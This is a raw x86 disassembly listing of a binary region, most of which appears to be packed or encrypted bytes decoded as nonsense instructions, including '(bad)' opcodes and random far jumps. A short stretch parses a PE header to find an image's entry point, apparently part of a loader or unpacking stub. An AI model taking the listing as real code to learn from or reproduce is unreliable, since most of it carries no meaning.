  41d785:	or     al,ch
  41d787:	stos   DWORD PTR es:[edi],eax
  41d788:	call   0xd3a2f072
  41d78d:	jbe    0x41d762
  41d78f:	adc    al,0xad
  41d791:	inc    ebx
  41d792:	lds    esp,FWORD PTR [eax-0x16640118]
  41d798:	mov    bl,bl
  41d79a:	and    ah,BYTE PTR [eax]
  41d79c:	jbe    0x41d776
  41d79e:	imul   ebp,DWORD PTR ds:0x33a76b36,0x1a
  41d7a5:	mov    ecx,0xd9b1f4d5
  41d7aa:	xor    BYTE PTR [ebx],al
  41d7ac:	jp     0x41d7d9
  41d7ae:	inc    esi
  41d7af:	xor    al,0xbd
  41d7b1:	mov    cl,0xb6
  41d7b3:	cs add al,0x48
  41d7b6:	sbb    esp,ecx
  41d7b8:	stc    
  41d7b9:	xor    DWORD PTR [edx-0x28],edi
  41d7bc:	add    al,0x44
  41d7be:	jns    0x41d7dc
  41d7c0:	pop    DWORD PTR [edi-0x52]
  41d7c3:	aas    
  41d7c4:	or     bl,BYTE PTR [edi]
  41d7c6:	mov    esi,DWORD PTR [edi+0x47d7f8ac]
  41d7cc:	sbb    eax,0xf9bff7f1
  41d7d1:	push   esp
  41d7d2:	cs repz cdq 
  41d7d5:	div    BYTE PTR [ecx+0x33de2740]
  41d7db:	jb     0x41d769
  41d7dd:	inc    ecx
  41d7de:	int3   
  41d7df:	jle    0x41d77a
  41d7e1:	or     eax,DWORD PTR [ecx-0x7502ce7]
  41d7e7:	loope  0x41d85b
  41d7e9:	fsubr  QWORD PTR [ecx+0xb]
  41d7ec:	mov    al,ds:0xfadd4bcc
  41d7f1:	cli    
  41d7f2:	ins    DWORD PTR es:[edi],dx
  41d7f3:	mov    ah,ah
  41d7f5:	and    al,al
  41d7f7:	enter  0x332,0xf3
  41d7fb:	lds    esi,FWORD PTR [eax-0x3c779472]
  41d801:	(bad)  
  41d802:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d803:	cmp    al,0x71
  41d805:	fmul   st,st(6)
  41d807:	mov    esi,0x8ca2907f
  41d80c:	gs loopne 0x41d860
  41d80f:	arpl   WORD PTR [ebx+0x51],bp
  41d812:	rcl    BYTE PTR [ebp+0xe7251a3],1
  41d818:	push   es
  41d819:	dec    esp
  41d81a:	jmp    0x7d22:0x1d157b26
  41d821:	add    ch,BYTE PTR [ebx+ecx*1-0x6cbddd8b]
  41d828:	leave  
  41d829:	cmp    dh,BYTE PTR [edi]
  41d82b:	or     BYTE PTR [edx+0x70d5d45a],bh
  41d831:	and    bh,al
  41d833:	mov    esp,ebp
  41d835:	mov    al,0x19
  41d837:	jns    0x41d8a9
  41d839:	adc    bx,WORD PTR [ebx]
  41d83c:	pushf  
  41d83d:	cs into 
  41d83f:	mov    al,0xc8
  41d841:	mov    ds:0x3fd4c2e8,eax
  41d846:	sub    BYTE PTR [ebx-0x6eba8cb9],al
  41d84c:	inc    esi
  41d84d:	xchg   ebx,eax
  41d84e:	ja     0x41d835
  41d850:	sti    
  41d851:	jmp    FWORD PTR [ecx-0x1d]
  41d854:	adc    ebp,DWORD PTR [eax+0x51796e59]
  41d85a:	inc    ebx
  41d85b:	ja     0x41d87e
  41d85d:	jecxz  0x41d8b2
  41d85f:	or     al,0xec
  41d861:	jp     0x41d84e
  41d863:	add    al,0x4c
  41d865:	mov    bh,0x23
  41d867:	add    DWORD PTR [esi-0x5498564c],ebp
  41d86d:	fcom   DWORD PTR [edi]
  41d86f:	dec    edi
  41d870:	fcomp  QWORD PTR [esi-0x53]
  41d873:	cmc    
  41d874:	test   al,0xd5
  41d876:	xor    eax,0xd41730f6
  41d87b:	imul   edx,DWORD PTR [ebx-0x5795c89e],0xffffffae
  41d882:	push   ss
  41d883:	(bad)  
  41d884:	and    al,0x9f
  41d886:	mov    ebp,0x7639b674
  41d88b:	outs   dx,DWORD PTR ds:[esi]
  41d88c:	gs pop edi
  41d88e:	test   al,0x41
  41d890:	jne    0x41d89e
  41d892:	xchg   ebp,eax
  41d893:	adc    al,0xc7
  41d895:	jae    0x41d8ea
  41d897:	push   edx
  41d898:	iret   
  41d899:	or     DWORD PTR [ebp-0x7e0d214a],0xb7a03966
  41d8a3:	push   ds
  41d8a4:	sub    al,0xec
  41d8a6:	or     DWORD PTR [ecx+0x5b],ecx
  41d8a9:	cmp    al,0x76
  41d8ab:	push   0xffffff8c
  41d8ad:	add    al,0xb2
  41d8af:	sbb    ebx,DWORD PTR ds:0xa6d2d6ef
  41d8b5:	mov    DWORD PTR [edx+0x3a],esi
  41d8b8:	mov    dh,0x24
  41d8ba:	sbb    al,0x42
  41d8bc:	lods   al,BYTE PTR ds:[esi]
  41d8bd:	pop    ebp
  41d8be:	cli    
  41d8bf:	daa    
  41d8c0:	imul   edx,esp,0x91db6852
  41d8c6:	pop    ss
  41d8c7:	sbb    eax,0x771670c0
  41d8cc:	cmp    al,0x85
  41d8ce:	xchg   edx,eax
  41d8cf:	das    
  41d8d0:	cwde   
  41d8d1:	scas   al,BYTE PTR es:[edi]
  41d8d2:	dec    ebp
  41d8d3:	xor    DWORD PTR [ebx-0xf],ebp
  41d8d6:	mov    edi,esp
  41d8d8:	xchg   esp,eax
  41d8d9:	mov    ecx,0x6cb0c693
  41d8de:	xchg   BYTE PTR [ecx],al
  41d8e0:	cmp    al,0x4b
  41d8e2:	cmp    al,0x8e
  41d8e4:	fnstsw WORD PTR [edx-0x551b409f]
  41d8ea:	leave  
  41d8eb:	and    ah,BYTE PTR [edi+0x53]
  41d8ee:	nop
  41d8ef:	iret   
  41d8f0:	loope  0x41d8ff
  41d8f2:	mov    eax,ds:0xc0ea6dd5
  41d8f7:	xlat   BYTE PTR ds:[ebx]
  41d8f8:	jmp    0x1d56417d
  41d8fd:	sti    
  41d8fe:	push   edi
  41d8ff:	sub    BYTE PTR [ebx+0x55],al
  41d902:	jge    0x41d8f0
  41d904:	jmp    0x2454:0x8b37e755
  41d90b:	sbb    BYTE PTR [ebx+0x31c247c],cl
  41d911:	ret    0xcf13
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x4225b8
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0x255c91bc,eax
  41d941:	stos   BYTE PTR es:[edi],al
  41d942:	jg     0x41d991
  41d944:	push   ss
  41d945:	sbb    BYTE PTR [edx+edx*1+0x4aa01818],bh
  41d94c:	ds daa 
  41d94e:	xchg   ebx,eax
  41d94f:	inc    edi
  41d950:	and    al,0x1e
  41d952:	xor    DWORD PTR [ecx],0xffffffa2
  41d955:	dec    esp
  41d956:	std    
  41d957:	jp     0x41d995
  41d959:	cld    
  41d95a:	cmp    eax,0x41d9882e
  41d95f:	cs ins DWORD PTR es:[edi],dx
  41d961:	push   0x437b45f
  41d966:	cmp    eax,ecx
  41d968:	rol    BYTE PTR [ecx+0x1575ade9],0xc7
  41d96f:	out    0x62,al
  41d971:	xchg   esp,eax
  41d972:	imul   esi,DWORD PTR [esi-0x20],0xe678cab1
  41d979:	xor    edx,eax
  41d97b:	out    0x35,eax
  41d97d:	sbb    edx,DWORD PTR [ecx]
  41d97f:	cmp    ebx,esp
  41d981:	sub    bh,BYTE PTR [esi-0x3]
  41d984:	jnp    0x41d9cd
  41d986:	loope  0x41d97f
  41d988:	sar    BYTE PTR [ebp-0x54bb8fe9],cl
  41d98e:	mov    eax,ds:0xa51b05c0
  41d993:	mov    gs,WORD PTR [edi+0x7f]
  41d996:	mov    edi,ecx
  41d998:	outs   dx,BYTE PTR ds:[esi]
  41d999:	out    dx,eax
  41d99a:	loope  0x41da0d
  41d99c:	or     al,bl
  41d99e:	push   ecx
  41d99f:	out    0xcf,al
  41d9a1:	or     ecx,DWORD PTR ds:0xb98bce8a
  41d9a7:	pop    esi
  41d9a8:	jp     0x41d940
  41d9aa:	sub    DWORD PTR [ebx+0x1f],eax
  41d9ad:	dec    ecx
  41d9ae:	lahf   
  41d9af:	jmp    DWORD PTR [ebp+0x9]
  41d9b2:	jmp    0x41d9fe
  41d9b4:	outs   dx,DWORD PTR ds:[esi]
  41d9b5:	in     eax,0x2c
  41d9b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9b8:	cld    
  41d9b9:	push   edx
  41d9ba:	mov    al,0x48
  41d9bc:	push   eax
  41d9bd:	add    al,0x5e
  41d9bf:	in     al,0x48
  41d9c1:	call   0x544359ed
  41d9c6:	mov    bh,0xc4
  41d9c8:	call   0xa739:0xfe72cc95
  41d9cf:	pop    eax
  41d9d0:	out    0xa7,al
  41d9d2:	mov    ds:0x31218eb8,al
  41d9d7:	jmp    0xea7d:0x9849e041
  41d9de:	mov    al,ds:0xd665700a
  41d9e3:	cli    
  41d9e4:	rcl    DWORD PTR [esi+eax*4],cl
  41d9e7:	stc    
  41d9e8:	fild   DWORD PTR [ebx-0x34]
  41d9eb:	push   esi
  41d9ec:	adc    BYTE PTR [ecx-0x330936be],ch
  41d9f2:	mov    ah,0x62
  41d9f4:	add    al,0x33
  41d9f6:	test   al,0x7b
  41d9f8:	mov    edx,DWORD PTR [esi+edi*4-0x4520f96]
  41d9ff:	(bad)  
  41da00:	adc    dh,al
  41da02:	mov    edi,0x7fea145b
  41da07:	jno    0x41da6b
  41da09:	ins    BYTE PTR es:[edi],dx
  41da0a:	cmp    edx,eax
  41da0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da0d:	cmp    ebp,DWORD PTR [ebx]
  41da0f:	out    0x72,eax
  41da11:	pop    ds
  41da12:	xchg   edi,eax
  41da13:	and    al,0xf7
  41da15:	int3   
  41da16:	cmc    
  41da17:	push   ebx
  41da18:	jnp    0x41da16
  41da1a:	sbb    eax,0xd3085141
  41da1f:	push   ds
  41da20:	jmp    0x41da7d
  41da22:	test   al,0xc9
  41da24:	cwde   
  41da25:	mov    bl,0xe4
  41da27:	shl    BYTE PTR [edi-0x67],0x56
  41da2b:	inc    ebp
  41da2c:	pop    ebp
  41da2d:	sub    BYTE PTR [eax+0x19],al
  41da30:	test   ecx,ebx
  41da32:	popa   
  41da33:	jnp    0x41da46
  41da35:	push   esi
  41da36:	arpl   WORD PTR [eax+0x162a449d],bx
  41da3c:	ins    DWORD PTR es:[edi],dx
  41da3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da3e:	cwde   
  41da3f:	or     al,0x24
  41da41:	(bad)  
  41da42:	sbb    BYTE PTR ds:0xc5118a3a,dl
  41da48:	adc    eax,0x8b28b379
  41da4d:	add    cl,0x8d
  41da50:	inc    esp
  41da51:	push   ebx
  41da52:	dec    edx
  41da53:	daa    
  41da54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da55:	jp     0x41da63
  41da57:	jne    0x41d9f1
  41da59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da5a:	and    BYTE PTR [eax+0x6ef818e9],bl
  41da60:	ins    DWORD PTR es:[edi],dx
  41da61:	and    al,0xf9
  41da63:	sahf   
  41da64:	jmp    0x63c8:0x559d89cf
  41da6b:	jecxz  0x41da9f
  41da6d:	ss dec esi
  41da6f:	pusha  
  41da70:	shl    bl,0x33
  41da73:	fs es push ecx
  41da76:	mov    edx,0xcf6e3cb0
  41da7b:	and    DWORD PTR [ebp-0x40de5c02],0x2994328a
  41da85:	push   esi
  41da86:	mov    DWORD PTR [ecx],esi
  41da88:	mov    dl,0x4a
  41da8a:	jecxz  0x41da1c
  41da8c:	jae    0x41dac3
  41da8e:	mov    eax,0xe5a7add4
  41da93:	cli    
  41da94:	pop    ebx
  41da95:	sub    al,0xc4
  41da97:	div    DWORD PTR [esi]
  41da99:	fcmovu st,st(1)
  41da9b:	in     eax,dx
  41da9c:	retf   0x7252
  41da9f:	pop    ebx
  41daa0:	ja     0x41da38
  41daa2:	outs   dx,DWORD PTR ds:[esi]
  41daa3:	ret    
  41daa4:	test   DWORD PTR [ebp+0x366f6ba3],0x26af5a5b
  41daae:	stos   DWORD PTR es:[edi],eax
  41daaf:	lods   al,BYTE PTR ds:[esi]
  41dab0:	pushf  
  41dab1:	ret    0xbc3d
  41dab4:	loopne 0x41dad7
  41dab6:	jmp    0xa9804dd3
  41dabb:	in     al,0x1c
  41dabd:	jecxz  0x41dabb
  41dabf:	add    DWORD PTR [ecx+0x2df5c306],eax
  41dac5:	push   esi
  41dac6:	sahf   
  41dac7:	mov    ebx,0xa49524ee
  41dacc:	cmc    
  41dacd:	xor    bl,cl
  41dacf:	jmp    0xb4faab53
  41dad4:	sub    eax,0xd94d8fda
  41dad9:	jg     0x41daaf
  41dadb:	loopne 0x41dab5
  41dadd:	daa    
  41dade:	xchg   esp,eax
  41dadf:	sahf   
  41dae0:	dec    ebx
  41dae1:	sbb    dh,bh
  41dae3:	clc    
  41dae4:	jbe    0x41db26
  41dae6:	sbb    eax,0x406b994
  41daeb:	test   eax,0x31846772
  41daf0:	cdq    
  41daf1:	xchg   esp,eax
  41daf2:	cmp    al,0xcb
  41daf4:	and    BYTE PTR [ebx+0x503136cb],ah
  41dafa:	mov    al,0x56
  41dafc:	xchg   esi,eax
  41dafd:	(bad)  
  41dafe:	mov    bh,0x67
  41db00:	mov    dl,BYTE PTR [ebx]
  41db02:	dec    ebp
  41db03:	pop    ss
  41db04:	dec    edx
  41db05:	xor    eax,0xf7352a
  41db0a:	inc    eax
  41db0b:	scas   eax,DWORD PTR es:[edi]
  41db0c:	retf   
  41db0d:	jo     0x41daa1
  41db0f:	or     ch,BYTE PTR [ebp+0x5571c80b]
  41db15:	xlat   BYTE PTR ds:[ebx]
  41db16:	mov    edi,0xb807d3ce
  41db1b:	aaa    
  41db1c:	inc    edi
  41db1d:	push   ebp
  41db1e:	adc    al,0xfb
  41db20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db21:	stos   DWORD PTR es:[edi],eax
  41db22:	add    BYTE PTR [esi],dh
  41db24:	lods   al,BYTE PTR ds:[esi]
  41db25:	out    0xd,eax
  41db27:	cmp    BYTE PTR [ecx+0x4a],al
  41db2a:	inc    ebx
  41db2b:	mov    ds:0xba7a536f,eax
  41db30:	or     eax,0x28c5a103
  41db35:	mov    eax,ds:0xad2fba25
  41db3a:	mov    ch,BYTE PTR [ecx+0x5f]
  41db3d:	aaa    
  41db3e:	jns    0x41dae5
  41db40:	idiv   DWORD PTR [ebp+0x54]
  41db43:	in     eax,dx
  41db44:	and    BYTE PTR [ecx],bl
  41db46:	mov    ds:0xd813540f,eax
  41db4b:	loopne 0x41db07
  41db4d:	mov    cs,WORD PTR [edi]
  41db4f:	mov    ch,0x76
  41db51:	mov    al,0xb1
  41db53:	inc    esi
  41db54:	pop    ebx
  41db55:	mov    al,ds:0x797617ca
  41db5a:	call   0x21e53449
  41db5f:	int3   
  41db60:	cmp    BYTE PTR [edi],cl
  41db62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db63:	inc    ecx
  41db64:	popa   
  41db65:	or     ebp,DWORD PTR [edx]
  41db67:	adc    edi,esp
  41db69:	xchg   ecx,eax
  41db6a:	xor    DWORD PTR ds:[edx-0x6b],0x39
  41db6f:	jmp    0x916b:0x50b0a27
  41db76:	sub    esp,DWORD PTR [edx+0x39]
  41db79:	js     0x41dbda
  41db7b:	ds adc al,0x95
  41db7e:	push   ebp
  41db7f:	xchg   ecx,eax
  41db80:	dec    ebx
  41db81:	pop    ebp
  41db82:	je     0x41dbe6
  41db84:	mov    edi,edi
  41db86:	pop    es
  41db87:	lock loop 0x41db46
  41db8a:	and    dh,BYTE PTR [ecx-0x35f4ac37]
  41db90:	jp     0x41db8f
  41db92:	and    eax,0xc94f92f4
  41db97:	pop    es
  41db98:	and    BYTE PTR [ebx+0x1a],ah
  41db9b:	xor    bl,BYTE PTR [edi]
  41db9d:	cmc    
  41db9e:	les    esi,FWORD PTR [edx]
  41dba0:	cmp    eax,0x3a0804ae
  41dba5:	int    0xc6
  41dba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dba8:	mov    ecx,0x9a997775
  41dbad:	gs cld 
  41dbaf:	dec    esi
  41dbb0:	cs cmp ebp,ecx
  41dbb3:	inc    ecx
  41dbb4:	dec    esp
  41dbb5:	xor    cl,BYTE PTR [ecx]
  41dbb7:	lahf   
  41dbb8:	mov    ah,0x98
  41dbba:	fdiv   st(3),st
  41dbbc:	iret   
  41dbbd:	pop    ecx
  41dbbe:	mov    ebx,0x8d2d06a1
  41dbc3:	cmp    eax,0xb30ce4df
  41dbc8:	lea    edi,[eax+eiz*4]
  41dbcb:	pop    esi
  41dbcc:	dec    edi
  41dbcd:	int    0x90
  41dbcf:	push   eax
  41dbd0:	adc    dl,BYTE PTR [ecx]
  41dbd2:	push   ss
  41dbd3:	adc    al,0x4d
  41dbd5:	(bad)  
  41dbd6:	jg     0x41dbd4
  41dbd8:	in     al,dx
  41dbd9:	mov    fs,esp
  41dbdb:	jns    0x41db77
  41dbdd:	pop    ebx
  41dbde:	shl    BYTE PTR [edi-0x72b42249],0x28
  41dbe5:	or     BYTE PTR [ecx-0x454fe4b8],al
  41dbeb:	xchg   edx,eax
  41dbec:	adc    ecx,edi
  41dbee:	aam    0x9
  41dbf0:	enter  0x73db,0x62
  41dbf4:	lds    ebx,FWORD PTR [ecx+0x67f93670]
  41dbfa:	fwait
  41dbfb:	adc    ch,0x23
  41dbfe:	fwait
  41dbff:	push   eax
  41dc00:	sbb    al,0xe2
  41dc02:	pop    edx
  41dc03:	and    BYTE PTR [esi],cl
  41dc05:	dec    ebp
  41dc06:	cwde   
  41dc07:	nop
  41dc08:	push   ecx
  41dc09:	fcom   QWORD PTR [ecx]
  41dc0b:	(bad)  
  41dc0c:	inc    esi
  41dc0d:	outs   dx,DWORD PTR ds:[esi]
  41dc0e:	push   cs
  41dc0f:	fadd   QWORD PTR [esi]
  41dc11:	jns    0x41dba5
  41dc13:	loope  0x41dc48
  41dc15:	stos   BYTE PTR es:[edi],al
  41dc16:	(bad)  
  41dc18:	addr16 gs xchg edi,eax
  41dc1b:	pop    ss
  41dc1c:	sub    eax,0xc0474391
  41dc21:	enter  0xab93,0x34
  41dc25:	bound  edi,QWORD PTR [esi]
  41dc27:	mov    edi,DWORD PTR [esi-0x6eefa5c8]
  41dc2d:	inc    edi
  41dc2e:	push   edx
  41dc2f:	sub    dh,BYTE PTR [ebp-0x3211abdb]
  41dc35:	xchg   ax,ax
  41dc37:	into   
  41dc38:	xor    eax,0x7c96d37a
  41dc3d:	adc    eax,DWORD PTR [edx]
  41dc3f:	ins    DWORD PTR es:[edi],dx
  41dc40:	sbb    esi,DWORD PTR [edx-0x73]
  41dc43:	add    DWORD PTR [edi-0x3b1ed2e6],esi
  41dc49:	enter  0x1b0b,0xb7
  41dc4d:	out    0x90,eax
  41dc4f:	dec    esp
  41dc50:	inc    ebp
  41dc51:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc53:	push   edi
  41dc54:	xchg   edi,eax
  41dc55:	mov    ecx,0x14888bc
  41dc5a:	pop    es
  41dc5b:	sti    
  41dc5c:	mov    edx,0xfd9b0d4c
  41dc61:	push   ebx
  41dc62:	in     al,dx
  41dc63:	mov    bh,0x8c
  41dc65:	add    al,BYTE PTR [eax]
  41dc67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc68:	rcl    DWORD PTR [edx+0x77],cl
  41dc6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc6c:	int3   
  41dc6d:	push   edi
  41dc6e:	xchg   ecx,eax
  41dc6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc70:	xor    al,0x6c
  41dc72:	lock push edx
  41dc74:	xor    BYTE PTR [esi-0x74],al
  41dc77:	adc    al,BYTE PTR [edx+0x14df2ba7]
  41dc7d:	test   DWORD PTR [ecx-0xc],ebx
  41dc80:	sbb    DWORD PTR [edx],eax
  41dc82:	xor    eax,0xc2a3e520
  41dc87:	cmp    bl,ah
  41dc89:	call   0x220f0299
  41dc8e:	(bad)  
  41dc8f:	ficomp DWORD PTR [esi]
  41dc91:	cmp    DWORD PTR [esi+0x3dfc5a0a],0xb8863b6d
  41dc9b:	cmp    al,0x9f
  41dc9d:	sti    
  41dc9e:	cwde   
  41dc9f:	fsub   DWORD PTR [edi-0x6764b9a9]
  41dca5:	dec    ebp
  41dca6:	dec    esi
  41dca7:	mov    esp,es
  41dca9:	test   eax,0x91c56cb0
  41dcaf:	bound  ecx,QWORD PTR [ebx+edx*1+0x864794d]
  41dcb6:	outs   dx,BYTE PTR ds:[esi]
  41dcb7:	dec    esp
  41dcb8:	mov    ebp,0xee647ea1
  41dcbd:	cdq    
  41dcbe:	dec    esp
  41dcbf:	pop    edx
  41dcc0:	mov    ch,0xe2
  41dcc2:	mov    ch,0xea
  41dcc4:	into   
  41dcc5:	pusha  
  41dcc6:	push   ebp
  41dcc7:	pusha  
  41dcc8:	(bad)
  41dccb:	push   edx
  41dccc:	and    eax,0xdd9f49b4
  41dcd1:	jb     0x41dcc0
  41dcd3:	mov    eax,0xefeaaee
  41dcd8:	inc    edi
  41dcd9:	lea    esp,[ebx+eax*2+0x276817c]
  41dce0:	mov    edx,0x6b89f18c
  41dce5:	pop    ebp
  41dce6:	test   BYTE PTR [edi],dh
  41dce8:	(bad)  
  41dce9:	sbb    dh,BYTE PTR [edx+0x2b9417c4]
  41dcef:	adc    DWORD PTR [esi-0x3694adec],0x7f
  41dcf6:	into   
  41dcf7:	adc    ebp,0x8d9b352d
  41dcfd:	inc    esp
  41dcfe:	and    al,0x6c
  41dd00:	push   eax
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0xffffff8e
  41dd5b:	mov    ebp,0x4722bef0
  41dd60:	push   ss
  41dd61:	sbb    BYTE PTR [edx+edx*1-0x3057e7e8],bh
  41dd68:	ins    DWORD PTR es:[edi],dx
  41dd69:	clc    
  41dd6a:	test   al,0xf9
  41dd6c:	jo     0x41dd0a
  41dd6e:	rcl    BYTE PTR [esi],1
  41dd70:	lahf   
  41dd71:	out    0x13,eax
  41dd73:	ja     0x41dd15
  41dd75:	lea    ecx,[eax-0x2c]
  41dd78:	pop    ds
  41dd79:	call   0x3682:0x67337355
  41dd80:	bound  esi,QWORD PTR [edx-0x32]
  41dd83:	mov    ebp,0x67f04f07
  41dd88:	test   eax,0xfc1d8f56
  41dd8d:	aad    0x68
  41dd8f:	push   ds
  41dd90:	adc    eax,0xd3b9cb45
  41dd95:	inc    ebx
  41dd96:	mov    ecx,0xb3553fcb
  41dd9b:	scas   al,BYTE PTR es:[edi]
  41dd9c:	sub    ch,cl
  41dd9e:	cmp    esi,esp
  41dda0:	jno    0x41dd76
  41dda2:	sar    esi,0x97
  41dda5:	inc    edi
  41dda6:	cwde   
  41dda7:	fs int3 
  41dda9:	gs add eax,0x6544aeea
  41ddaf:	xchg   edx,eax
  41ddb0:	dec    esi
  41ddb1:	add    eax,0xa179bf0
  41ddb6:	mul    ah
  41ddb8:	sbb    BYTE PTR [ebp-0x42],0xa1
  41ddbc:	add    dh,ah
  41ddbe:	outs   dx,DWORD PTR ds:[esi]
  41ddbf:	sub    BYTE PTR [ecx-0x1d],bl
  41ddc2:	push   0xd
  41ddc4:	mov    eax,0xd80b098c
  41ddc9:	ds jnp 0x41de44
  41ddcc:	sar    BYTE PTR [ecx-0x7c],cl
  41ddcf:	sub    eax,0x4f703c62
  41ddd4:	aaa    
  41ddd5:	test   DWORD PTR [ebx+0x24],ebx
  41ddd8:	ins    BYTE PTR es:[edi],dx
  41ddd9:	or     ah,cl
  41dddb:	retf   0xa2a6
  41ddde:	retf   
  41dddf:	xchg   esi,eax
  41dde0:	aaa    
  41dde1:	aam    0x3d
  41dde3:	or     bl,bl
  41dde5:	in     eax,dx
  41dde6:	popf   
  41dde7:	ins    BYTE PTR es:[edi],dx
  41dde8:	data16 jae 0x41ddc8
  41ddeb:	ins    BYTE PTR es:[edi],dx
  41ddec:	push   esp
  41dded:	jae    0x41de41
  41ddef:	das    
  41ddf0:	and    al,0xd6
  41ddf2:	xchg   ecx,eax
  41ddf3:	stc    
  41ddf4:	mov    bh,BYTE PTR [ebx+0xe9ab85c]
  41ddfa:	adc    al,0x84
  41ddfc:	jb     0x41de22
  41ddfe:	pop    esi
  41ddff:	out    dx,eax
  41de00:	sbb    DWORD PTR [ebx+0x2fc6d9f1],ebp
  41de06:	push   cs
  41de07:	sbb    ebp,DWORD PTR [ecx-0x3f]
  41de0a:	mov    eax,0xc2ad561a
  41de0f:	addr16 in al,dx
  41de11:	out    dx,eax
  41de12:	mov    ecx,0xceac61f0
  41de17:	mov    eax,ds:0xd427f67c
  41de1c:	xchg   ecx,eax
  41de1d:	mov    dl,0x8c
  41de1f:	bound  esi,QWORD PTR [edx-0x47]
  41de22:	in     al,dx
  41de23:	std    
  41de24:	pop    edi
  41de25:	shl    BYTE PTR [ecx+0x2c527490],1
  41de2b:	rol    BYTE PTR [edi+0x29],cl
  41de2e:	les    ebx,FWORD PTR [esi-0x49]
  41de31:	and    eax,0x131c71f1
  41de36:	adc    BYTE PTR [esi],bl
  41de38:	stc    
  41de39:	pop    ebx
  41de3a:	mov    ds:0x46065bcf,al
  41de3f:	imul   DWORD PTR [esi-0x4e]
  41de42:	sbb    edx,DWORD PTR [eax-0x32]
  41de45:	pop    ebp
  41de46:	add    bl,bh
  41de48:	pcmpgtb mm2,mm0
  41de4b:	pop    ebp
  41de4c:	mov    ds:0x6d9227c1,al
  41de51:	(bad)  
  41de52:	adc    dh,BYTE PTR [edi+0x40]
  41de55:	fisubr WORD PTR [eax]
  41de57:	jns    0x41de1c
  41de59:	push   edi
  41de5a:	adc    DWORD PTR [ebx+0x36],ebp
  41de5d:	xor    DWORD PTR [ebx+0x3a],esp
  41de60:	jns    0x41de0b
  41de62:	or     al,0x7d
  41de64:	push   ecx
  41de65:	jae    0x41dec7
  41de67:	je     0x41dec5
  41de69:	out    0x44,eax
  41de6b:	mov    eax,ds:0x6e022516
  41de70:	lea    ebx,[esi-0x66608939]
  41de76:	sbb    edx,DWORD PTR [edi-0x24655bbb]
  41de7c:	out    dx,al
  41de7d:	inc    ebp
  41de7e:	ds call 0x297a:0xb52f4442
  41de86:	dec    DWORD PTR [ebx]
  41de88:	adc    eax,0x1026b067
  41de8d:	rol    BYTE PTR [ecx-0x79],cl
  41de90:	mov    WORD PTR [eax-0x20877f79],es
  41de96:	les    esi,FWORD PTR [ebx]
  41de98:	push   ebx
  41de99:	jl     0x41dec9
  41de9b:	call   0xada96ca7
  41dea0:	cdq    
  41dea1:	mov    ds:0x4ef1c9ca,eax
  41dea6:	jne    0x41df13
  41dea8:	inc    ebx
  41dea9:	inc    esi
  41deaa:	push   es
  41deab:	shl    bl,cl
  41dead:	push   esp
  41deae:	lock inc edi
  41deb0:	xor    dh,BYTE PTR [ebx*1+0x53efd7ab]
  41deb7:	fsubp  st(3),st
  41deb9:	sbb    al,0xd0
  41debb:	js     0x41de5f
  41debd:	pop    ecx
  41debe:	mov    ebx,0xe14d0f3
  41dec3:	mov    al,0x5c
  41dec5:	daa    
  41dec6:	mov    edx,0xf22e133d
  41decb:	daa    
  41decc:	fldenv [ebx-0x3648289]
  41ded2:	ret    
  41ded3:	cmp    bh,BYTE PTR [ebx+0x63]
  41ded6:	popf   
  41ded7:	pusha  
  41ded8:	fdiv   QWORD PTR [esp+eiz*2]
  41dedb:	fsub   DWORD PTR [edi-0x42bdf78e]
  41dee1:	repnz sbb BYTE PTR [edi+0x45],bh
  41dee5:	aas    
  41dee6:	jl     0x41df03
  41dee8:	dec    edx
  41dee9:	xchg   bl,ch
  41deeb:	out    dx,eax
  41deec:	popa   
  41deed:	es addr16 dec esp
  41def0:	pop    ds
  41def1:	push   ds
  41def2:	leave  
  41def3:	sar    BYTE PTR [edx-0x33f17a6c],1
  41def9:	push   cs
  41defa:	inc    ebx
  41defb:	iret   
  41defc:	in     al,dx
  41defd:	jle    0x41df07
  41deff:	sbb    dh,BYTE PTR [esp+eax*4-0x308e5358]
  41df06:	aad    0x18
  41df08:	gs pop edi
  41df0a:	mov    eax,ds:0x4232afdd
  41df0f:	pop    edi
  41df10:	cmp    dh,BYTE PTR [esp+eiz*4-0x25]
  41df14:	mov    ch,0xd1
  41df16:	popf   
  41df17:	mov    esp,0xd8d9f486
